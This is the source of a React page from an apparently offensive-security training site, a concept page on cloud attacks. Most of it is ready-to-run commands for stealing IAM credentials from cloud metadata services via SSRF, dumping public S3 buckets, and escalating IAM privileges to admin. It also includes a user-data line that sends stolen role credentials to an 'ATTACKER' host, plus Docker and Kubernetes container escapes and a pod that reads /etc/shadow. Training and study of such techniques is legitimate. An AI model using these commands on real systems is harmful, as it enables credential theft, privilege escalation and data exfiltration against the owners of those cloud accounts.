'use client'
import React from 'react'
import Link from 'next/link'

const accent = '#ff9500'
const Pre = ({ label, children }: { label?: string; children: string }) => (
  <div style={{ margin: '1rem 0 1.5rem' }}>
    {label && <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '9px', color: '#5a6a4a', letterSpacing: '0.15em', marginBottom: '4px' }}>{label}</div>}
    <pre style={{ background: '#080600', border: `1px solid #3a2800`, borderRadius: '4px', padding: '1.25rem', overflow: 'auto', color: accent, fontFamily: 'JetBrains Mono, monospace', fontSize: '0.78rem', lineHeight: 1.7, whiteSpace: 'pre' as const }}>{children}</pre>
  </div>
)
const H2 = ({ children }: { children: React.ReactNode }) => (
  <h2 style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '1.1rem', fontWeight: 600, color: accent, marginTop: '3rem', marginBottom: '1rem' }}>
    <span style={{ color: '#3a2800', marginRight: '8px' }}>//</span>{children}
  </h2>
)
const P = ({ children }: { children: React.ReactNode }) => <p style={{ color: '#9a9a8a', lineHeight: 1.8, marginBottom: '1rem', fontSize: '0.9rem' }}>{children}</p>

export default function CloudSecurity() {
  return (
    <div>
      <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '2rem', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.7rem', color: '#5a6a4a' }}>
        <Link href="/" style={{ color: '#5a6a4a', textDecoration: 'none' }}>GHOSTNET</Link>
        <span>›</span><span style={{ color: accent }}>CLOUD SECURITY</span>
        <div style={{ marginLeft: 'auto', display: 'flex', gap: '8px' }}>
          <span style={{ padding: '3px 10px', background: `rgba(255,149,0,0.08)`, border: `1px solid rgba(255,149,0,0.3)`, borderRadius: '3px', color: accent, fontSize: '8px' }}>CONCEPT</span>
          <Link href="/modules/cloud-security/lab" style={{ textDecoration: 'none', padding: '3px 10px', border: '1px solid #1a2010', borderRadius: '3px', color: '#5a6a4a', fontSize: '8px' }}>LAB →</Link>
        </div>
      </div>

      <div style={{ marginBottom: '2.5rem' }}>
        <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '9px', color: '#5a6a4a', letterSpacing: '0.25em', marginBottom: '0.5rem' }}>ADVANCED MODULE · CONCEPT PAGE</div>
        <h1 style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '2rem', fontWeight: 700, color: accent, margin: '0.5rem 0', textShadow: `0 0 20px rgba(255,149,0,0.35)` }}>CLOUD SECURITY</h1>
        <p style={{ color: '#5a6a4a', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem' }}>AWS IAM exploitation · S3 misconfigs · Metadata APIs · GCP/Azure attacks · Container escapes · Serverless vulnerabilities</p>
      </div>

      <H2>01 — AWS Fundamentals for Attackers</H2>
      <Pre label="// AWS ATTACK SURFACE OVERVIEW">{`# AWS components attackers target:

# IAM (Identity & Access Management)
# → Overpermissioned roles, inline policies, privilege escalation
# → Key rotation issues, long-lived access keys in code

# S3 (Simple Storage Service)  
# → Public buckets with sensitive data
# → ACL misconfigs, bucket policy bypasses
# → Unauthenticated read/write/delete

# EC2 (Elastic Compute Cloud)
# → Metadata API (169.254.169.254) leaks credentials
# → User data scripts with hardcoded secrets
# → Security groups open to 0.0.0.0/0

# Lambda (Serverless)
# → Environment variables with secrets
# → Event injection, function permission abuse
# → Layer code injection

# EKS/ECS (Containers)
# → Escape to node, steal service account tokens
# → IMDS access from container

# RDS (Databases)
# → Publicly accessible instances
# → Snapshot sharing misconfigs
# → Weak passwords, no encryption`}</Pre>

      <H2>02 — AWS CLI Setup & Enumeration</H2>
      <Pre label="// SETUP AND BASIC ENUMERATION">{`# Install AWS CLI:
pip install awscli

# Configure credentials:
aws configure
# AWS Access Key ID: AKIA...
# AWS Secret Access Key: ...
# Default region: us-east-1
# Default output format: json

# Check who you are:
aws sts get-caller-identity

# List IAM users:
aws iam list-users

# List IAM roles:
aws iam list-roles

# Show your permissions:
aws iam get-user-policy --user-name YOUR_USER --policy-name POLICY
aws iam list-attached-user-policies --user-name YOUR_USER

# Enumerate S3 buckets:
aws s3 ls

# List bucket contents:
aws s3 ls s3://bucket-name

# Download everything from bucket:
aws s3 sync s3://bucket-name ./local-copy

# Enumerate EC2 instances:
aws ec2 describe-instances --output table

# List Lambda functions:
aws lambda list-functions

# Enumerate secrets:
aws secretsmanager list-secrets
aws ssm describe-parameters  # Parameter Store

# Check CloudTrail (logs of API calls):
aws cloudtrail describe-trails`}</Pre>

      <H2>03 — IMDS — Stealing Credentials from EC2</H2>
      <P>The Instance Metadata Service (IMDS) is accessible from every EC2 instance at 169.254.169.254. If an SSRF vulnerability exists in an application running on EC2, you can steal the instance's IAM credentials.</P>
      <Pre label="// IMDS EXPLOITATION VIA SSRF">{`# IMDSv1 (legacy, no auth required):
curl http://169.254.169.254/latest/meta-data/

# Get IAM role name:
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Get temporary credentials:
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME

# Returns:
# {
#   "AccessKeyId": "ASIA...",
#   "SecretAccessKey": "...",
#   "Token": "...",
#   "Expiration": "2024-01-01T00:00:00Z"
# }

# Use stolen credentials:
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...
aws sts get-caller-identity

# Via SSRF in web app:
# Find SSRF parameter, then:
# url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
# url=http://[::ffff:169.254.169.254]/latest/meta-data/  # IPv6 bypass

# IMDSv2 (requires PUT request for token first):
# Get token:
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
# Use token:
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Via SSRF with IMDSv2 — need PUT method support in vulnerable app`}</Pre>

      <H2>04 — S3 Bucket Attacks</H2>
      <Pre label="// FINDING AND EXPLOITING S3 MISCONFIGURATIONS">{`# Step 1: Find buckets (common naming patterns)
# company-backup, company-logs, company-dev, company-prod
# company-assets, company-data, company-uploads

# Check public access unauthenticated:
curl https://BUCKET-NAME.s3.amazonaws.com/

# List contents (if public):
curl "https://BUCKET-NAME.s3.amazonaws.com/?list-type=2"

# Download all files:
aws s3 sync s3://BUCKET-NAME ./ --no-sign-request  # unauthenticated

# Tools for finding buckets:
# 1. S3Scanner
pip install s3scanner
s3scanner --bucket-file wordlist.txt

# 2. GrayhatWarfare (web) — https://buckets.grayhatwarfare.com
# 3. AWS recon from leaked keys using pacu

# Check for write access:
aws s3 cp test.txt s3://BUCKET-NAME/test.txt --no-sign-request
# If succeeds → public write → dangerous

# Check for bucket policy:
aws s3api get-bucket-policy --bucket BUCKET-NAME

# Check for public ACL:
aws s3api get-bucket-acl --bucket BUCKET-NAME

# Interesting files to look for:
# .env, .env.production, .env.local
# config.json, secrets.json, credentials.csv
# backup.sql, database.sql, dump.sql
# private_key.pem, id_rsa
# wp-config.php, database.php`}</Pre>

      <H2>05 — IAM Privilege Escalation</H2>
      <Pre label="// ESCALATE FROM LOW-PRIV TO ADMIN IN AWS">{`# Many paths to admin from limited IAM access:

# Path 1: iam:CreatePolicyVersion
# If you can create new policy versions, replace existing policy with admin:
aws iam create-policy-version \
  --policy-arn arn:aws:iam::ACCOUNT:policy/POLICY_NAME \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}' \
  --set-as-default

# Path 2: iam:AttachUserPolicy
# Attach existing admin policy to yourself:
aws iam attach-user-policy \
  --user-name YOUR_USER \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# Path 3: iam:PassRole + ec2:RunInstances
# Create EC2 with admin role → exec commands on it → steal creds
aws ec2 run-instances \
  --image-id ami-12345678 \
  --instance-type t2.micro \
  --iam-instance-profile Name=ADMIN_ROLE \
  --user-data '#!/bin/bash\ncurl http://ATTACKER:8888/$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ADMIN_ROLE)'

# Path 4: lambda:CreateFunction + iam:PassRole
# Create Lambda with admin role → invoke it
aws lambda create-function \
  --function-name escalate \
  --runtime python3.9 \
  --role arn:aws:iam::ACCOUNT:role/ADMIN_ROLE \
  --handler index.handler \
  --zip-file fileb://payload.zip

# Tool: Pacu (AWS exploitation framework)
git clone https://github.com/RhinoSecurityLabs/pacu
pip install -r requirements.txt
python3 pacu.py
# In Pacu:
import_keys --all
run iam__enum_permissions
run iam__privesc_scan`}</Pre>

      <H2>06 — Container Escape</H2>
      <Pre label="// BREAK OUT OF DOCKER/K8S CONTAINERS">{`# Check if running in container:
cat /proc/1/cgroup | grep docker
ls /.dockerenv

# Check capabilities:
capsh --print
# Look for: cap_sys_admin, cap_net_admin, cap_sys_ptrace

# Escape via mounted Docker socket:
ls /var/run/docker.sock  # If exists → game over
docker -H unix:///var/run/docker.sock run -it --privileged \
  -v /:/host ubuntu /bin/sh
# Now you're root on the host: chroot /host

# Escape via privileged container:
# --privileged gives all capabilities
# Mount host filesystem:
mkdir /mnt/host
mount /dev/sda1 /mnt/host
chroot /mnt/host /bin/bash

# Kubernetes: steal service account token:
cat /var/run/secrets/kubernetes.io/serviceaccount/token
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace

# Use token to query K8s API:
APISERVER=https://kubernetes.default.svc
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -sSk -H "Authorization: Bearer $TOKEN" $APISERVER/api/v1/pods

# List secrets (if allowed):
curl -sSk -H "Authorization: Bearer $TOKEN" $APISERVER/api/v1/secrets

# Create privileged pod (if allowed):
kubectl --token=$TOKEN apply -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: escape
spec:
  containers:
  - name: escape
    image: ubuntu
    command: ["/bin/sh", "-c", "cat /host/etc/shadow"]
    volumeMounts:
    - name: host-root
      mountPath: /host
  volumes:
  - name: host-root
    hostPath:
      path: /
  hostPID: true
  hostNetwork: true
EOF`}</Pre>

      <H2>07 — GCP & Azure Quick Reference</H2>
      <Pre label="// GCP ATTACK PATTERNS">{`# GCP metadata endpoint:
curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
  -H "Metadata-Flavor: Google"

# Returns: access_token → use with gcloud

# Set token:
gcloud config set auth/access_token TOKEN

# Enumerate:
gcloud projects list
gcloud iam service-accounts list
gcloud storage buckets list
gcloud functions list

# GCP bucket public check:
gsutil ls gs://BUCKET-NAME
gsutil cat gs://BUCKET-NAME/file.txt

# Find public GCP buckets:
# https://www.googleapis.com/storage/v1/b/BUCKET_NAME
# HTTP 200 → public, 403 → private`}</Pre>

      <Pre label="// AZURE ATTACK PATTERNS">{`# Azure metadata:
curl -H "Metadata:true" \
  "http://169.254.169.254/metadata/instance?api-version=2021-02-01"

# Get token from managed identity:
curl -H "Metadata:true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# Use token:
az login --use-device-code
# Or set: AZURE_ACCESS_TOKEN

# Azure Blob Storage public access:
# https://STORAGE_ACCOUNT.blob.core.windows.net/CONTAINER/?restype=container&comp=list
# If no auth required → public

# Enumerate with az CLI:
az account list
az vm list
az storage account list
az keyvault list
az webapp list

# Find secrets in Key Vault:
az keyvault secret list --vault-name VAULT_NAME
az keyvault secret show --vault-name VAULT_NAME --name SECRET_NAME`}</Pre>

      <div style={{ marginTop: '4rem', paddingTop: '2rem', borderTop: `1px solid #3a2800`, display: 'flex', justifyContent: 'space-between' }}>
        <Link href="/" style={{ textDecoration: 'none', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem', color: '#5a6a4a' }}>← DASHBOARD</Link>
        <Link href="/modules/cloud-security/lab" style={{ textDecoration: 'none', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem', color: accent, padding: '8px 20px', border: `1px solid rgba(255,149,0,0.4)`, borderRadius: '4px', background: `rgba(255,149,0,0.06)` }}>PROCEED TO LAB →</Link>
      </div>
    </div>
  )
}
